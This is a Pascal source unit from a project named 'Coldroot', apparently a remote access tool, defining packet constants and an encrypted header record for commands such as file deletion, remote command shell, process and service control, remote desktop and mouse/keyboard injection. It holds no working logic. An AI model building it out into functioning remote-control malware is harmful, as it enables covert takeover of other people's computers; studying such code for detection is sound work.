(*
 * Project: Coldroot
 * User: Coldzer0
 * Date: 1/2/16
 *)
unit PacketTypes;

{$mode Delphi}
{$SMARTLINK ON}

interface

uses
    Classes;


const
//=========== Main Info ===============
    PACKET_SIGNATURE  = $DEAD;   // Our Sing ..
    PACKET_VERSION    = $01;      // Version of Current Client .. change it for new updates ..

//======== Packet Data Types ==========

    H_MainInfo      = 0;
    H_Ping          = 1;

        (* Main Manager Packets *)
//##########################
        //#
    H_MainManager   = 2;   //#
        //#
    H_FileManager   = 3;   //#
    H_GetFMInfo     = 4;
    H_GetAllinPath  = 5;

    H_RenameFile    = 6;
    H_DeleteFile    = 7;
    H_OpenFile      = 8;


    H_ProcessMan    = 9;   //#
    H_ServiceMan    = 10;  //#
    H_ConnectionMan = 11;  //#
        //#
        //#
    H_CMDStart      = 12;  //#
    H_GetCMDCommand = 13;  //#
    H_CMDSTOP       = 14;  //#
        //#
//#######################//#
//##########################
        //#
        //#
        //#
    H_RemoteDesktop = 15;  //#
    H_RD_STOP       = 16;  //#
    H_RD_START      = 17;  //#
        //#
    H_MouseDown     = 18;  //#
    H_MouseUp       = 19;  //#
    H_MouseMove     = 20;  //#
    H_KeyDown       = 21;  //#
    H_ACTIVE_WINDOW = 22;  //#
//#######################//#

//===============================#
type
    TTeaKey = array[0..3] of Longword;

type                         // packets Record <<
    TKeys = record
        RandomKey : TTeaKey;  // 4 Keys .. random keys for every single Packet
        BufferSize: Cardinal; // Packet Size
    end;


type
    PMainPacket = ^TMainPacket;
    TMainPacket = packed record   // The Main packet Header ..
        Header : TKeys;  // The key Header ..
        Signature: Word; // Sign for our Packets
        Version: Word;   // Version of Current Client
        DataType: Byte; // type Of Packet ..
    end;


implementation

end.